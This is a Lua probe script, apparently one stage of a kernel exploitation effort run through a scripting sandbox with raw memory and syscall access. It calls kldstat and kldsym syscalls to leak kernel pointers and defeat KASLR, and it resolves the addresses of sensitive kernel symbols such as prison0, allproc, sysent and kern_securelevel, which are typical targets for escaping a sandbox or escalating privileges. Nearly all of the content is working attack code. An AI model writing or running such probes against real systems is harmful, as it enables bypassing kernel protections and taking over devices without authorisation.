-- CRASH_CLASS: MODERATE
-- PROBE 53c: Repeat kldstat syscall IDs, structure sizes, and kldsym lookups.
-- Reopens: results/43a_kldstat_kaslr_20261016_180703.txt (145 B) and
-- results/43b_kldsym_resolve_20261016_180719.txt (116 B) contain headers only.
-- A pointer-shaped value is only a candidate until checked against independent evidence.

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end

local function signed32(v)
    if type(v) == "table" and v.h then
        if v.h == 0xFFFFFFFF then return v.l - 0x100000000 end
        if v.h == 0 and v.l >= 0x80000000 then return v.l - 0x100000000 end
    end
    local n = to_num(v)
    if n >= 0x80000000 and n < 0x100000000 then return n - 0x100000000 end
    return n
end

local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end

local function safe_rb(addr)
    local ok, val = pcall(function() return memory.read_byte(addr) end)
    if ok then return to_num(val) end
    return nil
end

local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end

local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end

local function safe_wb(addr, val)
    return pcall(function() memory.write_byte(addr, val % 256) end)
end

local function safe_wd(addr, val)
    return pcall(function() memory.write_dword(addr, val) end)
end

local function safe_wq(addr, val)
    return pcall(function() memory.write_qword(addr, val) end)
end

local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end

local function clear(buf, size)
    for off = 0, size - 1, 4 do safe_wd(buf + off, 0) end
end

local function report_stat(buf, size)
    local version = safe_rd(buf) or -1
    local name = ""
    for i = 0, 63 do
        local b = safe_rb(buf + 4 + i)
        if b and b > 0 and b < 128 then name = name .. string.char(b) else break end
    end
    print(string.format("  struct version=%d name=%s refs=%d id=%d",
        version, name, safe_rd(buf + 0x44) or -1, safe_rd(buf + 0x48) or -1))
    local addr = safe_rq(buf + 0x50)
    local sz = safe_rq(buf + 0x58)
    if addr then
        local hi, lo = get_hi_lo(addr)
        print(string.format("  address candidate=%08X_%08X", hi, lo))
        if hi >= 0xFFFF8000 and hi ~= 0xFFFFFFFF then print("  KERNEL-RANGE CANDIDATE (not yet validated)") end
    end
    if sz then
        local hi, lo = get_hi_lo(sz)
        print(string.format("  size=%08X_%08X", hi, lo))
    end
    local count = 0
    for off = 0, size - 8, 8 do
        local q = safe_rq(buf + off)
        if q then
            local hi, lo = get_hi_lo(q)
            if hi >= 0xFFFF8000 and hi ~= 0xFFFFFFFF then
                count = count + 1
                print(string.format("  pointer-shaped qword +0x%02X=%08X_%08X (candidate)", off, hi, lo))
            end
        end
    end
    print("  pointer-shaped qwords=" .. count)
end

local function dump(buf, length)
    for row = 0, length - 1, 16 do
        local hex = ""
        for col = 0, 15 do
            if row + col < length then hex = hex .. string.format("%02X ", safe_rb(buf + row + col) or 0) end
        end
        print(string.format("  +%03X: %s", row, hex))
    end
end

print("=== PROBE 53c: KLDSTAT/KLDSYM RETEST ===")
local stat_buf = memory.alloc(0x100)
local fileids = {1, 3}

for _, sysnum in ipairs({308, 367}) do
    local sc = make_syscall(sysnum)
    for _, fileid in ipairs(fileids) do
        clear(stat_buf, 0x100)
        safe_wd(stat_buf, 0x70)
        print(string.format("kldstat candidate syscall=%d fileid=%d version=0x70: BEFORE call", sysnum, fileid))
        local ok, ret = pcall(function() return sc(uint64(fileid), uint64(stat_buf)) end)
        local rv = ok and signed32(ret) or -999
        print(string.format("kldstat syscall=%d fileid=%d: %s ret=%d", sysnum, fileid, ok and "RETURNED" or "LUA-ERROR", rv))
        if ok and rv == 0 then report_stat(stat_buf, 0x100) end
    end

    clear(stat_buf, 0x100)
    safe_wd(stat_buf, 0x70)
    print(string.format("kldstat candidate syscall=%d fileid=1 stat=NULL: BEFORE call", sysnum))
    local null_ok, null_ret = pcall(function() return sc(uint64(1), uint64(0)) end)
    print(string.format("kldstat syscall=%d stat=NULL: %s ret=%d", sysnum,
        null_ok and "RETURNED" or "LUA-ERROR", null_ok and signed32(null_ret) or -999))

    clear(stat_buf, 0x100)
    safe_wd(stat_buf, 0x60)
    print(string.format("kldstat candidate syscall=%d fileid=1 version=0x60: BEFORE call", sysnum))
    local size_ok, size_ret = pcall(function() return sc(uint64(1), uint64(stat_buf)) end)
    local size_rv = size_ok and signed32(size_ret) or -999
    print(string.format("kldstat syscall=%d version=0x60: %s ret=%d", sysnum, size_ok and "RETURNED" or "LUA-ERROR", size_rv))
    if size_ok then
        local modified = false
        for off = 4, 0x5F do
            local b = safe_rb(stat_buf + off)
            if b and b ~= 0 then modified = true; break end
        end
        print("  bytes after version modified: " .. tostring(modified))
        if modified then
            dump(stat_buf, 0x60)
            report_stat(stat_buf, 0x60)
        end
    end
end

local name_buf = memory.alloc(128)
local lookup_buf = memory.alloc(64)
local sc_kldsym = make_syscall(337)
local symbols = {"prison0", "allproc", "kernel_pmap", "copyin", "copyout",
    "rootvnode", "sysent", "kern_securelevel", "printf", "bzero"}

local function write_string(buf, value)
    for i = 1, #value do safe_wb(buf + i - 1, string.byte(value, i)) end
    safe_wb(buf + #value, 0)
end

for _, fileid in ipairs({1, 0}) do
    for _, symbol in ipairs(symbols) do
        clear(lookup_buf, 64)
        safe_wd(lookup_buf, 32)
        write_string(name_buf, symbol)
        safe_wq(lookup_buf + 8, uint64(name_buf))
        print(string.format("kldsym(337) fileid=%d symbol=%s: BEFORE call", fileid, symbol))
        local ok, ret = pcall(function()
            return sc_kldsym(uint64(fileid), uint64(1), uint64(lookup_buf))
        end)
        local rv = ok and signed32(ret) or -999
        print(string.format("kldsym fileid=%d symbol=%s: %s ret=%d", fileid, symbol, ok and "RETURNED" or "LUA-ERROR", rv))
        if ok and rv == 0 then
            local value = safe_rq(lookup_buf + 16)
            local size = safe_rq(lookup_buf + 24)
            if value then
                local hi, lo = get_hi_lo(value)
                print(string.format("  symbol value candidate=%08X_%08X", hi, lo))
                if hi >= 0xFFFF8000 and hi ~= 0xFFFFFFFF then print("  KERNEL-RANGE SYMBOL CANDIDATE (validate independently)") end
            end
            if size then
                local hi, lo = get_hi_lo(size)
                print(string.format("  symbol size=%08X_%08X", hi, lo))
            end
        end
    end
end

print("Interpretation: syscall returns, structure changes, and validated addresses are separate evidence levels.")
print("=== PROBE 53c COMPLETE ===")
